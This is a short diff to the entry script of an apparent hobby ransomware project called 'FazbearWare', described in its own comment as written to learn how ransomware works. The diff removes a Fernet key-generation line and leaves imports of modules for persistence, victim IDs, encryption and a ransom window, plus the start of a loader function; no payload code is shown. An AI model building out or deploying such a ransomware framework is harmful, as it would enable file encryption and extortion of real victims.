@@ -1,12 +1,11 @@
 #This Code was maded only for edicational and learning purposes, i wanted to learn how ransomware works 
 
-from cryptography.fernet import Fernet 
+
 import persistence
 import victim_ID
 import encrypt
 import ransom_window_UI
 
-key = Fernet.generate_key() #KEY TO ENCRYPT AND DECRYPT 
 def run_fazbearware():
     print("""
     [!] FazbearWare Framework Loading...
